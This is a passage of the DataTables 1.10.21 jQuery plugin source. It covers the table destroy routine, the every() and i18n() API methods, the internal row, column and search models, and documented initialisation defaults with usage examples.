		return this.iterator( 'table', function ( settings ) {

			var orig      = settings.nTableWrapper.parentNode;

			var classes   = settings.oClasses;

			var table     = settings.nTable;

			var tbody     = settings.nTBody;

			var thead     = settings.nTHead;

			var tfoot     = settings.nTFoot;

			var jqTable   = $(table);

			var jqTbody   = $(tbody);

			var jqWrapper = $(settings.nTableWrapper);

			var rows      = $.map( settings.aoData, function (r) { return r.nTr; } );

			var i, ien;

	

			// Flag to note that the table is currently being destroyed - no action

			// should be taken

			settings.bDestroying = true;

	

			// Fire off the destroy callbacks for plug-ins etc

			_fnCallbackFire( settings, "aoDestroyCallback", "destroy", [settings] );

	

			// If not being removed from the document, make all columns visible

			if ( ! remove ) {

				new _Api( settings ).columns().visible( true );

			}

	

			// Blitz all `DT` namespaced events (these are internal events, the

			// lowercase, `dt` events are user subscribed and they are responsible

			// for removing them

			jqWrapper.off('.DT').find(':not(tbody *)').off('.DT');

			$(window).off('.DT-'+settings.sInstance);

	

			// When scrolling we had to break the table up - restore it

			if ( table != thead.parentNode ) {

				jqTable.children('thead').detach();

				jqTable.append( thead );

			}

	

			if ( tfoot && table != tfoot.parentNode ) {

				jqTable.children('tfoot').detach();

				jqTable.append( tfoot );

			}

	

			settings.aaSorting = [];

			settings.aaSortingFixed = [];

			_fnSortingClasses( settings );

	

			$( rows ).removeClass( settings.asStripeClasses.join(' ') );

	

			$('th, td', thead).removeClass( classes.sSortable+' '+

				classes.sSortableAsc+' '+classes.sSortableDesc+' '+classes.sSortableNone

			);

	

			// Add the TR elements back into the table in their original order

			jqTbody.children().detach();

			jqTbody.append( rows );

	

			// Remove the DataTables generated nodes, events and classes

			var removedMethod = remove ? 'remove' : 'detach';

			jqTable[ removedMethod ]();

			jqWrapper[ removedMethod ]();

	

			// If we need to reattach the table to the document

			if ( ! remove && orig ) {

				// insertBefore acts like appendChild if !arg[1]

				orig.insertBefore( table, settings.nTableReinsertBefore );

	

				// Restore the width of the original table - was read from the style property,

				// so we can restore directly to that

				jqTable

					.css( 'width', settings.sDestroyWidth )

					.removeClass( classes.sTable );

	

				// If the were originally stripe classes - then we add them back here.

				// Note this is not fool proof (for example if not all rows had stripe

				// classes - but it's a good effort without getting carried away

				ien = settings.asDestroyStripes.length;

	

				if ( ien ) {

					jqTbody.children().each( function (i) {

						$(this).addClass( settings.asDestroyStripes[i % ien] );

					} );

				}

			}

	

			/* Remove the settings object from the settings array */

			var idx = $.inArray( settings, DataTable.settings );

			if ( idx !== -1 ) {

				DataTable.settings.splice( idx, 1 );

			}

		} );

	} );

	

	

	// Add the `every()` method for rows, columns and cells in a compact form

	$.each( [ 'column', 'row', 'cell' ], function ( i, type ) {

		_api_register( type+'s().every()', function ( fn ) {

			var opts = this.selector.opts;

			var api = this;

	

			return this.iterator( type, function ( settings, arg1, arg2, arg3, arg4 ) {

				// Rows and columns:

				//  arg1 - index

				//  arg2 - table counter

				//  arg3 - loop counter

				//  arg4 - undefined

				// Cells:

				//  arg1 - row index

				//  arg2 - column index

				//  arg3 - table counter

				//  arg4 - loop counter

				fn.call(

					api[ type ](

						arg1,

						type==='cell' ? arg2 : opts,

						type==='cell' ? opts : undefined

					),

					arg1, arg2, arg3, arg4

				);

			} );

		} );

	} );

	

	

	// i18n method for extensions to be able to use the language object from the

	// DataTable

	_api_register( 'i18n()', function ( token, def, plural ) {

		var ctx = this.context[0];

		var resolved = _fnGetObjectDataFn( token )( ctx.oLanguage );

	

		if ( resolved === undefined ) {

			resolved = def;

		}

	

		if ( plural !== undefined && $.isPlainObject( resolved ) ) {

			resolved = resolved[ plural ] !== undefined ?

				resolved[ plural ] :

				resolved._;

		}

	

		return resolved.replace( '%d', plural ); // nb: plural might be undefined,

	} );

	/**

	 * Version string for plug-ins to check compatibility. Allowed format is

	 * `a.b.c-d` where: a:int, b:int, c:int, d:string(dev|beta|alpha). `d` is used

	 * only for non-release builds. See http://semver.org/ for more information.

	 *  @member

	 *  @type string

	 *  @default Version number

	 */

	DataTable.version = "1.10.21";



	/**

	 * Private data store, containing all of the settings objects that are

	 * created for the tables on a given page.

	 *

	 * Note that the `DataTable.settings` object is aliased to

	 * `jQuery.fn.dataTableExt` through which it may be accessed and

	 * manipulated, or `jQuery.fn.dataTable.settings`.

	 *  @member

	 *  @type array

	 *  @default []

	 *  @private

	 */

	DataTable.settings = [];



	/**

	 * Object models container, for the various models that DataTables has

	 * available to it. These models define the objects that are used to hold

	 * the active state and configuration of the table.

	 *  @namespace

	 */

	DataTable.models = {};

	

	

	

	/**

	 * Template object for the way in which DataTables holds information about

	 * search information for the global filter and individual column filters.

	 *  @namespace

	 */

	DataTable.models.oSearch = {

		/**

		 * Flag to indicate if the filtering should be case insensitive or not

		 *  @type boolean

		 *  @default true

		 */

		"bCaseInsensitive": true,

	

		/**

		 * Applied search term

		 *  @type string

		 *  @default <i>Empty string</i>

		 */

		"sSearch": "",

	

		/**

		 * Flag to indicate if the search term should be interpreted as a

		 * regular expression (true) or not (false) and therefore and special

		 * regex characters escaped.

		 *  @type boolean

		 *  @default false

		 */

		"bRegex": false,

	

		/**

		 * Flag to indicate if DataTables is to use its smart filtering or not.

		 *  @type boolean

		 *  @default true

		 */

		"bSmart": true

	};

	

	

	

	

	/**

	 * Template object for the way in which DataTables holds information about

	 * each individual row. This is the object format used for the settings

	 * aoData array.

	 *  @namespace

	 */

	DataTable.models.oRow = {

		/**

		 * TR element for the row

		 *  @type node

		 *  @default null

		 */

		"nTr": null,

	

		/**

		 * Array of TD elements for each row. This is null until the row has been

		 * created.

		 *  @type array nodes

		 *  @default []

		 */

		"anCells": null,

	

		/**

		 * Data object from the original data source for the row. This is either

		 * an array if using the traditional form of DataTables, or an object if

		 * using mData options. The exact type will depend on the passed in

		 * data from the data source, or will be an array if using DOM a data

		 * source.

		 *  @type array|object

		 *  @default []

		 */

		"_aData": [],

	

		/**

		 * Sorting data cache - this array is ostensibly the same length as the

		 * number of columns (although each index is generated only as it is

		 * needed), and holds the data that is used for sorting each column in the

		 * row. We do this cache generation at the start of the sort in order that

		 * the formatting of the sort data need be done only once for each cell

		 * per sort. This array should not be read from or written to by anything

		 * other than the master sorting methods.

		 *  @type array

		 *  @default null

		 *  @private

		 */

		"_aSortData": null,

	

		/**

		 * Per cell filtering data cache. As per the sort data cache, used to

		 * increase the performance of the filtering in DataTables

		 *  @type array

		 *  @default null

		 *  @private

		 */

		"_aFilterData": null,

	

		/**

		 * Filtering data cache. This is the same as the cell filtering cache, but

		 * in this case a string rather than an array. This is easily computed with

		 * a join on `_aFilterData`, but is provided as a cache so the join isn't

		 * needed on every search (memory traded for performance)

		 *  @type array

		 *  @default null

		 *  @private

		 */

		"_sFilterRow": null,

	

		/**

		 * Cache of the class name that DataTables has applied to the row, so we

		 * can quickly look at this variable rather than needing to do a DOM check

		 * on className for the nTr property.

		 *  @type string

		 *  @default <i>Empty string</i>

		 *  @private

		 */

		"_sRowStripe": "",

	

		/**

		 * Denote if the original data source was from the DOM, or the data source

		 * object. This is used for invalidating data, so DataTables can

		 * automatically read data from the original source, unless uninstructed

		 * otherwise.

		 *  @type string

		 *  @default null

		 *  @private

		 */

		"src": null,

	

		/**

		 * Index in the aoData array. This saves an indexOf lookup when we have the

		 * object, but want to know the index

		 *  @type integer

		 *  @default -1

		 *  @private

		 */

		"idx": -1

	};

	

	

	/**

	 * Template object for the column information object in DataTables. This object

	 * is held in the settings aoColumns array and contains all the information that

	 * DataTables needs about each individual column.

	 *

	 * Note that this object is related to {@link DataTable.defaults.column}

	 * but this one is the internal data store for DataTables's cache of columns.

	 * It should NOT be manipulated outside of DataTables. Any configuration should

	 * be done through the initialisation options.

	 *  @namespace

	 */

	DataTable.models.oColumn = {

		/**

		 * Column index. This could be worked out on-the-fly with $.inArray, but it

		 * is faster to just hold it as a variable

		 *  @type integer

		 *  @default null

		 */

		"idx": null,

	

		/**

		 * A list of the columns that sorting should occur on when this column

		 * is sorted. That this property is an array allows multi-column sorting

		 * to be defined for a column (for example first name / last name columns

		 * would benefit from this). The values are integers pointing to the

		 * columns to be sorted on (typically it will be a single integer pointing

		 * at itself, but that doesn't need to be the case).

		 *  @type array

		 */

		"aDataSort": null,

	

		/**

		 * Define the sorting directions that are applied to the column, in sequence

		 * as the column is repeatedly sorted upon - i.e. the first value is used

		 * as the sorting direction when the column if first sorted (clicked on).

		 * Sort it again (click again) and it will move on to the next index.

		 * Repeat until loop.

		 *  @type array

		 */

		"asSorting": null,

	

		/**

		 * Flag to indicate if the column is searchable, and thus should be included

		 * in the filtering or not.

		 *  @type boolean

		 */

		"bSearchable": null,

	

		/**

		 * Flag to indicate if the column is sortable or not.

		 *  @type boolean

		 */

		"bSortable": null,

	

		/**

		 * Flag to indicate if the column is currently visible in the table or not

		 *  @type boolean

		 */

		"bVisible": null,

	

		/**

		 * Store for manual type assignment using the `column.type` option. This

		 * is held in store so we can manipulate the column's `sType` property.

		 *  @type string

		 *  @default null

		 *  @private

		 */

		"_sManualType": null,

	

		/**

		 * Flag to indicate if HTML5 data attributes should be used as the data

		 * source for filtering or sorting. True is either are.

		 *  @type boolean

		 *  @default false

		 *  @private

		 */

		"_bAttrSrc": false,

	

		/**

		 * Developer definable function that is called whenever a cell is created (Ajax source,

		 * etc) or processed for input (DOM source). This can be used as a compliment to mRender

		 * allowing you to modify the DOM element (add background colour for example) when the

		 * element is available.

		 *  @type function

		 *  @param {element} nTd The TD node that has been created

		 *  @param {*} sData The Data for the cell

		 *  @param {array|object} oData The data for the whole row

		 *  @param {int} iRow The row index for the aoData data store

		 *  @default null

		 */

		"fnCreatedCell": null,

	

		/**

		 * Function to get data from a cell in a column. You should <b>never</b>

		 * access data directly through _aData internally in DataTables - always use

		 * the method attached to this property. It allows mData to function as

		 * required. This function is automatically assigned by the column

		 * initialisation method

		 *  @type function

		 *  @param {array|object} oData The data array/object for the array

		 *    (i.e. aoData[]._aData)

		 *  @param {string} sSpecific The specific data type you want to get -

		 *    'display', 'type' 'filter' 'sort'

		 *  @returns {*} The data for the cell from the given row's data

		 *  @default null

		 */

		"fnGetData": null,

	

		/**

		 * Function to set data for a cell in the column. You should <b>never</b>

		 * set the data directly to _aData internally in DataTables - always use

		 * this method. It allows mData to function as required. This function

		 * is automatically assigned by the column initialisation method

		 *  @type function

		 *  @param {array|object} oData The data array/object for the array

		 *    (i.e. aoData[]._aData)

		 *  @param {*} sValue Value to set

		 *  @default null

		 */

		"fnSetData": null,

	

		/**

		 * Property to read the value for the cells in the column from the data

		 * source array / object. If null, then the default content is used, if a

		 * function is given then the return from the function is used.

		 *  @type function|int|string|null

		 *  @default null

		 */

		"mData": null,

	

		/**

		 * Partner property to mData which is used (only when defined) to get

		 * the data - i.e. it is basically the same as mData, but without the

		 * 'set' option, and also the data fed to it is the result from mData.

		 * This is the rendering method to match the data method of mData.

		 *  @type function|int|string|null

		 *  @default null

		 */

		"mRender": null,

	

		/**

		 * Unique header TH/TD element for this column - this is what the sorting

		 * listener is attached to (if sorting is enabled.)

		 *  @type node

		 *  @default null

		 */

		"nTh": null,

	

		/**

		 * Unique footer TH/TD element for this column (if there is one). Not used

		 * in DataTables as such, but can be used for plug-ins to reference the

		 * footer for each column.

		 *  @type node

		 *  @default null

		 */

		"nTf": null,

	

		/**

		 * The class to apply to all TD elements in the table's TBODY for the column

		 *  @type string

		 *  @default null

		 */

		"sClass": null,

	

		/**

		 * When DataTables calculates the column widths to assign to each column,

		 * it finds the longest string in each column and then constructs a

		 * temporary table and reads the widths from that. The problem with this

		 * is that "mmm" is much wider then "iiii", but the latter is a longer

		 * string - thus the calculation can go wrong (doing it properly and putting

		 * it into an DOM object and measuring that is horribly(!) slow). Thus as

		 * a "work around" we provide this option. It will append its value to the

		 * text that is found to be the longest string for the column - i.e. padding.

		 *  @type string

		 */

		"sContentPadding": null,

	

		/**

		 * Allows a default value to be given for a column's data, and will be used

		 * whenever a null data source is encountered (this can be because mData

		 * is set to null, or because the data source itself is null).

		 *  @type string

		 *  @default null

		 */

		"sDefaultContent": null,

	

		/**

		 * Name for the column, allowing reference to the column by name as well as

		 * by index (needs a lookup to work by name).

		 *  @type string

		 */

		"sName": null,

	

		/**

		 * Custom sorting data type - defines which of the available plug-ins in

		 * afnSortData the custom sorting will use - if any is defined.

		 *  @type string

		 *  @default std

		 */

		"sSortDataType": 'std',

	

		/**

		 * Class to be applied to the header element when sorting on this column

		 *  @type string

		 *  @default null

		 */

		"sSortingClass": null,

	

		/**

		 * Class to be applied to the header element when sorting on this column -

		 * when jQuery UI theming is used.

		 *  @type string

		 *  @default null

		 */

		"sSortingClassJUI": null,

	

		/**

		 * Title of the column - what is seen in the TH element (nTh).

		 *  @type string

		 */

		"sTitle": null,

	

		/**

		 * Column sorting and filtering type

		 *  @type string

		 *  @default null

		 */

		"sType": null,

	

		/**

		 * Width of the column

		 *  @type string

		 *  @default null

		 */

		"sWidth": null,

	

		/**

		 * Width of the column when it was first "encountered"

		 *  @type string

		 *  @default null

		 */

		"sWidthOrig": null

	};

	

	

	/*

	 * Developer note: The properties of the object below are given in Hungarian

	 * notation, that was used as the interface for DataTables prior to v1.10, however

	 * from v1.10 onwards the primary interface is camel case. In order to avoid

	 * breaking backwards compatibility utterly with this change, the Hungarian

	 * version is still, internally the primary interface, but is is not documented

	 * - hence the @name tags in each doc comment. This allows a Javascript function

	 * to create a map from Hungarian notation to camel case (going the other direction

	 * would require each property to be listed, which would at around 3K to the size

	 * of DataTables, while this method is about a 0.5K hit.

	 *

	 * Ultimately this does pave the way for Hungarian notation to be dropped

	 * completely, but that is a massive amount of work and will break current

	 * installs (therefore is on-hold until v2).

	 */

	

	/**

	 * Initialisation options that can be given to DataTables at initialisation

	 * time.

	 *  @namespace

	 */

	DataTable.defaults = {

		/**

		 * An array of data to use for the table, passed in at initialisation which

		 * will be used in preference to any data which is already in the DOM. This is

		 * particularly useful for constructing tables purely in Javascript, for

		 * example with a custom Ajax call.

		 *  @type array

		 *  @default null

		 *

		 *  @dtopt Option

		 *  @name DataTable.defaults.data

		 *

		 *  @example

		 *    // Using a 2D array data source

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "data": [

		 *          ['Trident', 'Internet Explorer 4.0', 'Win 95+', 4, 'X'],

		 *          ['Trident', 'Internet Explorer 5.0', 'Win 95+', 5, 'C'],

		 *        ],

		 *        "columns": [

		 *          { "title": "Engine" },

		 *          { "title": "Browser" },

		 *          { "title": "Platform" },

		 *          { "title": "Version" },

		 *          { "title": "Grade" }

		 *        ]

		 *      } );

		 *    } );

		 *

		 *  @example

		 *    // Using an array of objects as a data source (`data`)

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "data": [

		 *          {

		 *            "engine":   "Trident",

		 *            "browser":  "Internet Explorer 4.0",

		 *            "platform": "Win 95+",

		 *            "version":  4,

		 *            "grade":    "X"

		 *          },

		 *          {

		 *            "engine":   "Trident",

		 *            "browser":  "Internet Explorer 5.0",

		 *            "platform": "Win 95+",

		 *            "version":  5,

		 *            "grade":    "C"

		 *          }

		 *        ],

		 *        "columns": [

		 *          { "title": "Engine",   "data": "engine" },

		 *          { "title": "Browser",  "data": "browser" },

		 *          { "title": "Platform", "data": "platform" },

		 *          { "title": "Version",  "data": "version" },

		 *          { "title": "Grade",    "data": "grade" }

		 *        ]

		 *      } );

		 *    } );

		 */

		"aaData": null,

	

	

		/**

		 * If ordering is enabled, then DataTables will perform a first pass sort on

		 * initialisation. You can define which column(s) the sort is performed

		 * upon, and the sorting direction, with this variable. The `sorting` array

		 * should contain an array for each column to be sorted initially containing

		 * the column's index and a direction string ('asc' or 'desc').

		 *  @type array

		 *  @default [[0,'asc']]

		 *

		 *  @dtopt Option

		 *  @name DataTable.defaults.order

		 *

		 *  @example

		 *    // Sort by 3rd column first, and then 4th column

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "order": [[2,'asc'], [3,'desc']]

		 *      } );

		 *    } );

		 *

		 *    // No initial sorting

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "order": []

		 *      } );

		 *    } );

		 */

		"aaSorting": [[0,'asc']],

	

	

		/**

		 * This parameter is basically identical to the `sorting` parameter, but

		 * cannot be overridden by user interaction with the table. What this means

		 * is that you could have a column (visible or hidden) which the sorting

		 * will always be forced on first - any sorting after that (from the user)

		 * will then be performed as required. This can be useful for grouping rows

		 * together.

		 *  @type array

		 *  @default null

		 *

		 *  @dtopt Option

		 *  @name DataTable.defaults.orderFixed

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "orderFixed": [[0,'asc']]

		 *      } );

		 *    } )

		 */

		"aaSortingFixed": [],

	

	

		/**

		 * DataTables can be instructed to load data to display in the table from a

		 * Ajax source. This option defines how that Ajax call is made and where to.

		 *

		 * The `ajax` property has three different modes of operation, depending on

		 * how it is defined. These are:

		 *

		 * * `string` - Set the URL from where the data should be loaded from.

		 * * `object` - Define properties for `jQuery.ajax`.

		 * * `function` - Custom data get function

		 *

		 * `string`

		 * --------

		 *

		 * As a string, the `ajax` property simply defines the URL from which

		 * DataTables will load data.

		 *

		 * `object`

		 * --------

		 *

		 * As an object, the parameters in the object are passed to

		 * [jQuery.ajax](http://api.jquery.com/jQuery.ajax/) allowing fine control

		 * of the Ajax request. DataTables has a number of default parameters which

		 * you can override using this option. Please refer to the jQuery

		 * documentation for a full description of the options available, although

		 * the following parameters provide additional options in DataTables or

		 * require special consideration:

		 *

		 * * `data` - As with jQuery, `data` can be provided as an object, but it

		 *   can also be used as a function to manipulate the data DataTables sends

		 *   to the server. The function takes a single parameter, an object of

		 *   parameters with the values that DataTables has readied for sending. An

		 *   object may be returned which will be merged into the DataTables

		 *   defaults, or you can add the items to the object that was passed in and

		 *   not return anything from the function. This supersedes `fnServerParams`

		 *   from DataTables 1.9-.

		 *

		 * * `dataSrc` - By default DataTables will look for the property `data` (or

		 *   `aaData` for compatibility with DataTables 1.9-) when obtaining data

		 *   from an Ajax source or for server-side processing - this parameter

		 *   allows that property to be changed. You can use Javascript dotted

		 *   object notation to get a data source for multiple levels of nesting, or

		 *   it my be used as a function. As a function it takes a single parameter,

		 *   the JSON returned from the server, which can be manipulated as

		 *   required, with the returned value being that used by DataTables as the

		 *   data source for the table. This supersedes `sAjaxDataProp` from

		 *   DataTables 1.9-.

		 *

		 * * `success` - Should not be overridden it is used internally in

		 *   DataTables. To manipulate / transform the data returned by the server

		 *   use `ajax.dataSrc`, or use `ajax` as a function (see below).

		 *

		 * `function`

		 * ----------

		 *

		 * As a function, making the Ajax call is left up to yourself allowing

		 * complete control of the Ajax request. Indeed, if desired, a method other

		 * than Ajax could be used to obtain the required data, such as Web storage

		 * or an AIR database.

		 *

		 * The function is given four parameters and no return is required. The

		 * parameters are:

		 *

		 * 1. _object_ - Data to send to the server

		 * 2. _function_ - Callback function that must be executed when the required

		 *    data has been obtained. That data should be passed into the callback

		 *    as the only parameter

		 * 3. _object_ - DataTables settings object for the table

		 *

		 * Note that this supersedes `fnServerData` from DataTables 1.9-.

		 *

		 *  @type string|object|function

		 *  @default null

		 *

		 *  @dtopt Option

		 *  @name DataTable.defaults.ajax

		 *  @since 1.10.0

		 *

		 * @example

		 *   // Get JSON data from a file via Ajax.

		 *   // Note DataTables expects data in the form `{ data: [ ...data... ] }` by default).

		 *   $('#example').dataTable( {

		 *     "ajax": "data.json"

		 *   } );

		 *

		 * @example

		 *   // Get JSON data from a file via Ajax, using `dataSrc` to change

		 *   // `data` to `tableData` (i.e. `{ tableData: [ ...data... ] }`)

		 *   $('#example').dataTable( {

		 *     "ajax": {

		 *       "url": "data.json",

		 *       "dataSrc": "tableData"

		 *     }

		 *   } );

		 *

		 * @example

		 *   // Get JSON data from a file via Ajax, using `dataSrc` to read data

		 *   // from a plain array rather than an array in an object

		 *   $('#example').dataTable( {

		 *     "ajax": {

		 *       "url": "data.json",

		 *       "dataSrc": ""

		 *     }

		 *   } );

		 *

		 * @example

		 *   // Manipulate the data returned from the server - add a link to data

		 *   // (note this can, should, be done using `render` for the column - this

		 *   // is just a simple example of how the data can be manipulated).

		 *   $('#example').dataTable( {

		 *     "ajax": {

		 *       "url": "data.json",

		 *       "dataSrc": function ( json ) {

		 *         for ( var i=0, ien=json.length ; i<ien ; i++ ) {

		 *           json[i][0] = '<a href="/message/'+json[i][0]+'>View message</a>';

		 *         }

		 *         return json;

		 *       }

		 *     }

		 *   } );

		 *

		 * @example

		 *   // Add data to the request

		 *   $('#example').dataTable( {

		 *     "ajax": {

		 *       "url": "data.json",

		 *       "data": function ( d ) {

		 *         return {

		 *           "extra_search": $('#extra').val()

		 *         };

		 *       }

		 *     }

		 *   } );

		 *

		 * @example

		 *   // Send request as POST

		 *   $('#example').dataTable( {

		 *     "ajax": {

		 *       "url": "data.json",

		 *       "type": "POST"

		 *     }

		 *   } );

		 *

		 * @example

		 *   // Get the data from localStorage (could interface with a form for

		 *   // adding, editing and removing rows).

		 *   $('#example').dataTable( {

		 *     "ajax": function (data, callback, settings) {

		 *       callback(

		 *         JSON.parse( localStorage.getItem('dataTablesData') )

		 *       );

		 *     }

		 *   } );

		 */

		"ajax": null,

	

	

		/**

		 * This parameter allows you to readily specify the entries in the length drop

		 * down menu that DataTables shows when pagination is enabled. It can be

		 * either a 1D array of options which will be used for both the displayed

		 * option and the value, or a 2D array which will use the array in the first

		 * position as the value, and the array in the second position as the

		 * displayed options (useful for language strings such as 'All').

		 *

		 * Note that the `pageLength` property will be automatically set to the

		 * first value given in this array, unless `pageLength` is also provided.

		 *  @type array

		 *  @default [ 10, 25, 50, 100 ]

		 *

		 *  @dtopt Option

		 *  @name DataTable.defaults.lengthMenu

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "lengthMenu": [[10, 25, 50, -1], [10, 25, 50, "All"]]

		 *      } );

		 *    } );

		 */

		"aLengthMenu": [ 10, 25, 50, 100 ],

	

	

		/**

		 * The `columns` option in the initialisation parameter allows you to define

		 * details about the way individual columns behave. For a full list of

		 * column options that can be set, please see

		 * {@link DataTable.defaults.column}. Note that if you use `columns` to

		 * define your columns, you must have an entry in the array for every single

		 * column that you have in your table (these can be null if you don't which

		 * to specify any options).

		 *  @member

		 *

		 *  @name DataTable.defaults.column

		 */

		"aoColumns": null,

	

		/**

		 * Very similar to `columns`, `columnDefs` allows you to target a specific

		 * column, multiple columns, or all columns, using the `targets` property of

		 * each object in the array. This allows great flexibility when creating

		 * tables, as the `columnDefs` arrays can be of any length, targeting the

		 * columns you specifically want. `columnDefs` may use any of the column

		 * options available: {@link DataTable.defaults.column}, but it _must_

		 * have `targets` defined in each object in the array. Values in the `targets`

		 * array may be:

		 *   <ul>

		 *     <li>a string - class name will be matched on the TH for the column</li>

		 *     <li>0 or a positive integer - column index counting from the left</li>

		 *     <li>a negative integer - column index counting from the right</li>

		 *     <li>the string "_all" - all columns (i.e. assign a default)</li>

		 *   </ul>

		 *  @member

		 *

		 *  @name DataTable.defaults.columnDefs

		 */

		"aoColumnDefs": null,

	

	

		/**

		 * Basically the same as `search`, this parameter defines the individual column

		 * filtering state at initialisation time. The array must be of the same size

		 * as the number of columns, and each element be an object with the parameters

		 * `search` and `escapeRegex` (the latter is optional). 'null' is also

		 * accepted and the default will be used.

		 *  @type array

		 *  @default []

		 *

		 *  @dtopt Option

		 *  @name DataTable.defaults.searchCols

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "searchCols": [

		 *          null,

		 *          { "search": "My filter" },

		 *          null,

		 *          { "search": "^[0-9]", "escapeRegex": false }

		 *        ]

		 *      } );

		 *    } )

		 */

		"aoSearchCols": [],

	

	

		/**

		 * An array of CSS classes that should be applied to displayed rows. This

		 * array may be of any length, and DataTables will apply each class

		 * sequentially, looping when required.

		 *  @type array

		 *  @default null <i>Will take the values determined by the `oClasses.stripe*`

		 *    options</i>

		 *

		 *  @dtopt Option

		 *  @name DataTable.defaults.stripeClasses

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "stripeClasses": [ 'strip1', 'strip2', 'strip3' ]

		 *      } );

		 *    } )

		 */

		"asStripeClasses": null,

	

	

		/**

		 * Enable or disable automatic column width calculation. This can be disabled

		 * as an optimisation (it takes some time to calculate the widths) if the

		 * tables widths are passed in using `columns`.

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.autoWidth

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "autoWidth": false

		 *      } );

		 *    } );

		 */

		"bAutoWidth": true,

	

	

		/**

		 * Deferred rendering can provide DataTables with a huge speed boost when you

		 * are using an Ajax or JS data source for the table. This option, when set to

		 * true, will cause DataTables to defer the creation of the table elements for

		 * each row until they are needed for a draw - saving a significant amount of

		 * time.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.deferRender

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "ajax": "sources/arrays.txt",

		 *        "deferRender": true

		 *      } );

		 *    } );

		 */

		"bDeferRender": false,

	

	

		/**

		 * Replace a DataTable which matches the given selector and replace it with

		 * one which has the properties of the new initialisation object passed. If no

		 * table matches the selector, then the new DataTable will be constructed as

		 * per normal.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.destroy

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "srollY": "200px",

		 *        "paginate": false

		 *      } );

		 *

		 *      // Some time later....

		 *      $('#example').dataTable( {

		 *        "filter": false,

		 *        "destroy": true

		 *      } );

		 *    } );

		 */

		"bDestroy": false,

	

	

		/**

		 * Enable or disable filtering of data. Filtering in DataTables is "smart" in

		 * that it allows the end user to input multiple words (space separated) and

		 * will match a row containing those words, even if not in the order that was

		 * specified (this allow matching across multiple columns). Note that if you

		 * wish to use filtering in DataTables this must remain 'true' - to remove the

		 * default filtering input box and retain filtering abilities, please use

		 * {@link DataTable.defaults.dom}.

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.searching

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "searching": false

		 *      } );

		 *    } );

		 */

		"bFilter": true,

	

	

		/**

		 * Enable or disable the table information display. This shows information

		 * about the data that is currently visible on the page, including information

		 * about filtered data if that action is being performed.

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.info

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "info": false

		 *      } );

		 *    } );

		 */

		"bInfo": true,

	

	

		/**

		 * Allows the end user to select the size of a formatted page from a select

		 * menu (sizes are 10, 25, 50 and 100). Requires pagination (`paginate`).

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.lengthChange

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "lengthChange": false

		 *      } );

		 *    } );

		 */

		"bLengthChange": true,

	

	

		/**

		 * Enable or disable pagination.

		 *  @type boolean

		 *  @default true

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.paging

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "paging": false

		 *      } );

		 *    } );

		 */

		"bPaginate": true,

	

	

		/**

		 * Enable or disable the display of a 'processing' indicator when the table is

		 * being processed (e.g. a sort). This is particularly useful for tables with

		 * large amounts of data where it can take a noticeable amount of time to sort

		 * the entries.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Features

		 *  @name DataTable.defaults.processing

		 *

		 *  @example

		 *    $(document).ready( function () {

		 *      $('#example').dataTable( {

		 *        "processing": true

		 *      } );

		 *    } );

		 */

		"bProcessing": false,

	

	

		/**

		 * Retrieve the DataTables object for the given selector. Note that if the

		 * table has already been initialised, this parameter will cause DataTables

		 * to simply return the object that has already been set up - it will not take

		 * account of any changes you might have made to the initialisation object

		 * passed to DataTables (setting this parameter to true is an acknowledgement

		 * that you understand this). `destroy` can be used to reinitialise a table if

		 * you need.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.retrieve

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      initTable();

		 *      tableActions();

		 *    } );

		 *

		 *    function initTable ()

		 *    {

		 *      return $('#example').dataTable( {

		 *        "scrollY": "200px",

		 *        "paginate": false,

		 *        "retrieve": true

		 *      } );

		 *    }

		 *

		 *    function tableActions ()

		 *    {

		 *      var table = initTable();

		 *      // perform API operations with oTable

		 *    }

		 */

		"bRetrieve": false,

	

	

		/**

		 * When vertical (y) scrolling is enabled, DataTables will force the height of

		 * the table's viewport to the given height at all times (useful for layout).

		 * However, this can look odd when filtering data down to a small data set,

		 * and the footer is left "floating" further down. This parameter (when

		 * enabled) will cause DataTables to collapse the table's viewport down when

		 * the result set will fit within the given Y height.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Options

		 *  @name DataTable.defaults.scrollCollapse

		 *

		 *  @example

		 *    $(document).ready( function() {

		 *      $('#example').dataTable( {

		 *        "scrollY": "200",

		 *        "scrollCollapse": true

		 *      } );

		 *    } );

		 */

		"bScrollCollapse": false,

	

	

		/**

		 * Configure DataTables to use server-side processing. Note that the

		 * `ajax` parameter must also be given in order to give DataTables a

		 * source to obtain the required data for each draw.

		 *  @type boolean

		 *  @default false

		 *

		 *  @dtopt Features

		 *  @dtopt Server-side

		 *  @name DataTable.defaults.serverSide

		 *

		 *  @example

